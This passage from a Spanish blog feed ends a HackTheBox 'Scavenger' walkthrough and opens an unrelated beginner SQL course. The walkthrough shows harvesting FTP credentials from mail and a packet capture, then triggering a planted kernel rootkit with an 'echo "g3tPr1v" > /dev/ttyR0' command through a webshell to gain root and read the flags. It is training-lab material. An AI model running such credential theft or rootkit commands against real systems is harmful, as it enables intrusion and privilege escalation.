&lt;p&gt;Vemos que existe un correo el cual al leerlo obtenemos las credenciales del usuario &lt;code&gt;ib01ftp:YhgRt56_Ta&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /var/spool/mail/ib01c03
&amp;gt; From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
Return-path: &amp;lt;support@ib01.supersechosting.htb&amp;gt;
Envelope-to: ib01c03@ib01.supersechosting.htb
Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
Received: from support by ib01.supersechosting.htb with local (Exim 4.89)
	(envelope-from &amp;lt;support@ib01.supersechosting.htb&amp;gt;)
	id 1gWRtI-0000ZK-8Q
	for ib01c03@ib01.supersechosting.htb; Mon, 10 Dec 2018 21:10:56 +0100
To: &amp;lt;ib01c03@ib01.supersechosting.htb&amp;gt;
Subject: Re: Please help! Site Defaced!
In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
	&amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
References: &amp;lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&amp;gt;
X-Mailer: mail (GNU Mailutils 3.1.1)
Message-Id: &amp;lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&amp;gt;
From: support &amp;lt;support@ib01.supersechosting.htb&amp;gt;
Date: Mon, 10 Dec 2018 21:10:56 +0100
X-IMAPbase: 1544472964 2
Status: O
X-UID: 1

&amp;gt;&amp;gt; Please we need your help. Our site has been defaced!
&amp;gt;&amp;gt; What we should do now?
&amp;gt;&amp;gt;
&amp;gt;&amp;gt; rentahacker.htb

Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
Please check if there is any strange file in your web root and upload it to the ftp server:
ftp.supersechosting.htb
user: ib01ftp
pass: YhgRt56_Ta

Thanks.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como las credenciales estan asociadas a &lt;code&gt;ftp&lt;/code&gt; y el puerto se encuentra abierto probamos a conectarnos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    4 1005     1000         4096 Dec 10  2018 incidents
226 Directory send OK.
ftp&amp;gt; cd incidents
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xrwx---    2 1005     1000         4096 Jan 30  2019 ib01c01
dr-xrwx---    2 1005     1000         4096 Dec 10  2018 ib01c03
226 Directory send OK.
ftp&amp;gt; cd ib01c01
250 Directory successfully changed.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--rw-r--    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
-rw-r--r--    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
-r--rw-r--    1 1005     1000          173 Dec 11  2018 notes.txt
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al conectarnos vemos un archivo log, una nota y un archivo pcap, los cuales vamos a traernos a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; binary on
200 Switching to Binary mode.
ftp&amp;gt; prompt off
Interactive mode off.
ftp&amp;gt; mget *
local: ib01c01.access.log remote: ib01c01.access.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01.access.log (10427 bytes).
226 Transfer complete.
10427 bytes received in 0.45 secs (22.5332 kB/s)
local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
226 Transfer complete.
835084 bytes received in 4.99 secs (163.5452 kB/s)
local: notes.txt remote: notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notes.txt (173 bytes).
226 Transfer complete.
173 bytes received in 0.00 secs (861.9659 kB/s)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La nota nos da una pista.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat notes.txt
After checking the logs and the network capture, all points to that the attacker knows valid credentials and abused a recently discovered vuln to gain access to the server!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Analizando la captura con &lt;code&gt;tshark&lt;/code&gt; obtenemos una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tshark -r ib01c01_incident.pcap -Y &quot;http.request.method==POST&quot; -Tfields -e 'tcp.payload' | xxd -ps -r
Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.
POST /admin530o6uisg/index.php?rand=1544475115839 HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.pwnhats.htb/admin530o6uisg/index.php?controller=AdminLogin&amp;amp;token=de267fd50b09d00b04cca76ff620b201
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
cache-control: no-cache
X-Requested-With: XMLHttpRequest
Content-Length: 195
ajax=1&amp;amp;token=&amp;amp;controller=AdminLogin&amp;amp;submitLogin=1&amp;amp;passwd=GetYouAH4t%21&amp;amp;email=pwnhats%40pwnhats.htb&amp;amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05bPOST /admin530o6uisg/index.php?controller=AdminCustomerThreads&amp;amp;token=8d8e4db864318da7655c7f2d8175815f HTTP/1.1
Host: www.pwnhats.htb
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si urldecodeamos la contraseña, obtemos que es equivalente a &lt;code&gt;GetYouAH4t!&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;GetYouAH4t%21&quot;);
GetYouAH4t!
php &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como el propieatio de la captura era el usuario &lt;code&gt;ib01c01&lt;/code&gt; vamos a conectarnos con ese usuario haciendo uso de la credencial obtenida.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora proderemos a traernos y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat user.txt
e8dd26ca8a139f83116a1744aa6d1826
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si bien examinamos por encima el archivo &lt;code&gt;pcap&lt;/code&gt; con la ayuda de &lt;code&gt;tshark&lt;/code&gt;, vamos a volver a examinarlo esta vez mediante &lt;code&gt;wireshark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Al abrirnos &lt;code&gt;wireshark&lt;/code&gt;, vemos que en el archivo pcap existen peticiones &lt;code&gt;GET&lt;/code&gt; a un archivo de nombre &lt;code&gt;root.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si seguimos el fujo tcp para tratar de ver el contenido, obsevamos todo el script en &lt;code&gt;C&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del script, vemos una cadena &lt;code&gt;Got r00t&lt;/code&gt;, que llama mucho la atención y podemos ponernos a pensar que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y si tratamos de investigar esa cadena del script, vemos un articulo que nos confirma que se trata de un &lt;code&gt;rootkit&lt;/code&gt; y nos dice como podemos aprovecharnos de este.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&quot;&gt;https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Basicamente lo que hace es cargar un modulo llamado &lt;code&gt;root.ko&lt;/code&gt; y al enviar la cadena &lt;code&gt;echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; comando&lt;/code&gt;, esta lo ejecutara como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Probamos a ejecutar la cadena, pero vemos que lo ejecutamos como nuestro usuario, y esto quiero pensar que es debido a que si bien el proceso de &lt;code&gt;rootkit&lt;/code&gt; es el mismo, la cadena debe de ser distinta.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
echo &quot;g0tR0ot&quot; &amp;gt; /dev/ttyR0; whoami
&amp;gt; ib01c03
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por ello necesitamos encontrar el &lt;code&gt;root.ko&lt;/code&gt; que en principio es el que carga el &lt;code&gt;rootkit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si nos volvemos a conectar como el usuario &lt;code&gt;ib01c01&lt;/code&gt;, y listamos los archivo ocultos vemos uno inusual &lt;code&gt;...&lt;/code&gt; y si ingresamos al directorio encontramos el &lt;code&gt;root.ko&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ftp 10.10.10.155
Connected to 10.10.10.155.
220 (vsFTPd 3.0.3)
Name (10.10.10.155:fmiracle): ib01c01
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    4 1001     1004         4096 Sep 01  2021 .
drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
lrwxrwxrwx    1 0        0               9 Sep 01  2021 .bash_history -&amp;gt; /dev/null
-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
-rw-r-----    1 0        1004           33 Jun 24 00:10 user.txt
drwxr-xr-x   26 1001     1004         4096 Sep 01  2021 www
226 Directory send OK.
ftp&amp;gt; cd ...
250 Directory successfully changed.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          399400 Feb 02  2019 root.ko
226 Directory send OK.
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a traernos el archivo y examinarlo con nuestra maquina con &lt;code&gt;radare2&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ftp&amp;gt; get root.ko
local: root.ko remote: root.ko
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for root.ko (399400 bytes).
226 Transfer complete.
399400 bytes received in 3.94 secs (98.9888 kB/s)
ftp&amp;gt; quit
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ radare2 root.ko
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
 -- give | and &amp;gt; a try piping and redirection
[0x08000070]&amp;gt; aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08000070]&amp;gt; afl
0x08000070    1 8            sym.root_open
0x08000080    1 9            sym.root_read
0x08000090   11 359          sym.root_write
0x080001f7    7 292          sym.root_init
0x0800031b    1 82           sym.root_exit
[0x08000070]&amp;gt; s sym.root_write
[0x08000090]&amp;gt; pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al examinarlo vemos que la cadena &lt;code&gt;g0tR0ot&lt;/code&gt; fue reemplaza por la cadena en dos partes &lt;code&gt;g3tPr1v&lt;/code&gt;, asi que vamos a probar mandando esta nueva cadena.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Scavenger/sca10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap python3 tty_over_http.py
echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; whoami
&amp;gt; root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez vemos que el &lt;code&gt;rootkit&lt;/code&gt; si funciona, asi que ahora que tenemos privilegios como &lt;code&gt;root&lt;/code&gt; solo nos quedaria visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; cat /root/root.txt
&amp;gt; 8c1482a3a42eb925f6e2a6ed49535065
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Scavenger</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Scavenger</guid>
        
        <category>Domain Zone Transfer</category>
        
        <category>Sql inyection</category>
        
        <category>ftp enumaration</category>
        
        <category>Whois</category>
        
        <category>Pcap analysis</category>
        
        <category>rootkit</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Aprende SQL desde cero y dominalo como un experto</title>
        <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programación mas utilizado del mundo, exacto me refiero a &lt;code&gt;SQL&lt;/code&gt;, realizaremos todo un curso completo desde cero y explicaremos todo lo necesario para que puedas dominarlo en su totalidad, asi que comenzemos ya que debes aprenderlo ahora mismo!.&lt;/p&gt;

&lt;h2 id=&quot;que-es-sql&quot;&gt;QUE ES SQL? &lt;a href=&quot;#que-es-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como mencionamos anteriormente &lt;code&gt;SQL&lt;/code&gt; es un lenguaje de programación, como?, si es un lenguaje de programación y nos sirve para almacenar y procesar información en una base de datos relacional.&lt;/p&gt;

&lt;p&gt;Pero que es una base de datos relaciona?&lt;/p&gt;

&lt;p&gt;Pues una base de datos relacional almacena información en forma de tabla, con filas y columnas que representan diferentes atributos de datos y las diversas relaciones entre los valores de datos.&lt;/p&gt;

&lt;h2 id=&quot;aprender-sql&quot;&gt;POR QUE DEBO APRENDER SQL? &lt;a href=&quot;#aprender-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Es necesario aprenderlo ya que es un lenguaje de consulta popular que se usa con frecuencia en todos los tipos de aplicaciones. Los analistas y desarrolladores de datos aprenden y usan &lt;code&gt;SQL&lt;/code&gt; porque se integra bien con los diferentes lenguajes de programación.&lt;/p&gt;

&lt;h2 id=&quot;indice-y-estructura&quot;&gt;INDICE Y ESTRUCTURA&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#que-es-sql&quot;&gt;Que es SQL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#aprender-sql&quot;&gt;Por que debo aprender SQL?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;Tipos de Bases de datos SQL &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-base-de-datos&quot;&gt;Crear Base de Datos - CREATE DATABASE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#crear-tabla&quot;&gt;Crear Tabla - CREATE TABLE&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#campos&quot;&gt;Campos&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#registros&quot;&gt;Registros&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#valor-de-campo&quot;&gt;Valor de Campo&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#columnas&quot;&gt;Columnas&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;Insertar Valores en Tabla - INSERT INTO&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#consultas-o-querys&quot;&gt;Consultas o Querys&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-select&quot;&gt;Instrucción SELECT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;Modificar Tabla - ALTER TABLE&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-tabla&quot;&gt;Renombrar Tabla&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#renombrar-columna&quot;&gt;Renombrar Columna&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#agregar-columna&quot;&gt;Agregar Columna&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-columna&quot;&gt;Eliminar Columna&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-drop&quot;&gt;Instrucción DROP&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;Eliminar Base de Datos - DROP DATABASE&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;Eliminar Tabla - DROP TABLE&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#identificadores&quot;&gt;Identificadores&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;Claves Primarias - PRIMARY KEYS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-delete&quot;&gt;Instrucción DELETE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;Claves Foraneas - FOREIGN KEYS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-as-o-alias&quot;&gt;Clausula AS o ALIAS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-order-by&quot;&gt;Clausula ORDER BY&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-where&quot;&gt;Clausula WHERE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instruccion-update&quot;&gt;Instrucción UPDATE&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#operadores-en-sql&quot;&gt;Operadores en SQL&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#operadores-and-y-or&quot;&gt;Operadores AND Y OR&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#operador-and&quot;&gt;Operador AND&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#operador-or&quot;&gt;Operador OR&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-not&quot;&gt;Operador NOT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-limit&quot;&gt;Operador LIMIT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-distinct&quot;&gt;Operador DISTINCT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador BETWEEN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador LIKE&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;Operador IS NULL y IS NOT NULL&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#operador-in-y-not-in&quot;&gt;Operador IN y NOT IN&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentarios-en-sql&quot;&gt;Comentario en SQL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentar-una-linea&quot;&gt;Comentar una linea&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comentar-varias-lineas&quot;&gt;Comentar varias lineas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#funciones-de-agregacion&quot;&gt;Funciones de Agregación&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-sum&quot;&gt;Función SUM&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-count&quot;&gt;Función COUNT&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-min&quot;&gt;Sentencia MIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-max&quot;&gt;Sentencia MAX&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-avg&quot;&gt;Sentencia AVG&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#funcion-round&quot;&gt;Sentencia ROUND&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-group-by&quot;&gt;Clausula GROUP BY&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-having&quot;&gt;Clausula HAVING&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#subconsultas&quot;&gt;Subconsultas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#joins&quot;&gt;JOINS&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#cross-join&quot;&gt;CROSS JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#inner-join&quot;&gt;INNER JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#left-join&quot;&gt;LEFT JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#right-join&quot;&gt;RIGHT JOIN&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#full-join&quot;&gt;FULL JOIN&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-union&quot;&gt;Clausula UNION&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#clausula-union-all&quot;&gt;Clausula UNION ALL&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#indices&quot;&gt;Indices&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-ordinarios-index&quot;&gt;Indices Ordinarios - INDEX&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;Indices Primarios - Primary Keys&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;Indices Unicos - UNIQUE INDEX&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vistas&quot;&gt;Vistas&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#bloqueos&quot;&gt;Bloqueos&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;Bloqueos Compartidos - SHARED LOCKS&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;Bloqueos Reservados - RESERVED LOCKS&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;Bloqueos Exclusivos - EXCLUSIVE LOCKS&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;Transacciones - BEGIN TRANSACTION&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#procedimientos-almacenados&quot;&gt;Procedimientos Almancenados&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sql-y-python&quot;&gt;SQL y Python&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;Funciones Definidas por el Usuario - USER DEFINED FUNCTIONS&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tipos-de-datos-sql&quot;&gt;TIPOS DE BASES DE DATOS SQL &lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Existen muchos tipos de gestores de bases de datos sql, pero afortunadamente, la mayoría son muy parecidos y la lógica es la misma. Tienen alguna que otra sentencia diferente, pero por lo general, aprender un tipo de SQL te permitirá manejar cualquiera de las otras.&lt;/p&gt;

&lt;p&gt;En este caso concreto para el curso usaremos &lt;code&gt;Sqlite&lt;/code&gt; ya que este es el gestor de uso mas comun y es compatible con muchos lenguajes de programación y ademas no tiene servidor de base da datos dedicado para poder ejecutarlo y esta integrado directamente con la aplicación lo que nos facilita su uso.&lt;/p&gt;

&lt;h2 id=&quot;instalación&quot;&gt;INSTALACIÓN &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La instalación es super sencilla solo debemos ir a la pagina oficial de sqlite para ello aqui dejo el enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.sqlite.org/download.html&quot;&gt;https://www.sqlite.org/download.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para este caso ya que lo instalación lo hare en &lt;code&gt;windows&lt;/code&gt;, una vez estemos en el enlace debemos descargarnos el archivo de nombre &lt;code&gt;sqlite-tools-win32-x86-3420000.zip&lt;/code&gt;. Seguidamente lo descomprimimos y copiamos el contenido en una carpeta creada en la raiz de nuestro disco &lt;code&gt;C:&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Seguidamente lo que haremos sera ir a nuestro buscador y buscar &lt;code&gt;Editar las variables del Entorno del Sistema&lt;/code&gt; y se nos abrira la siguente ventana:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora debemos darle a &lt;code&gt;Variables de Entorno &amp;gt; Path &amp;gt; Editar &amp;gt; Nuevo&lt;/code&gt;  y pegaremos la ruta de nuestra carpeta donde descomprimimos los archivos y guardamos.&lt;/p&gt;

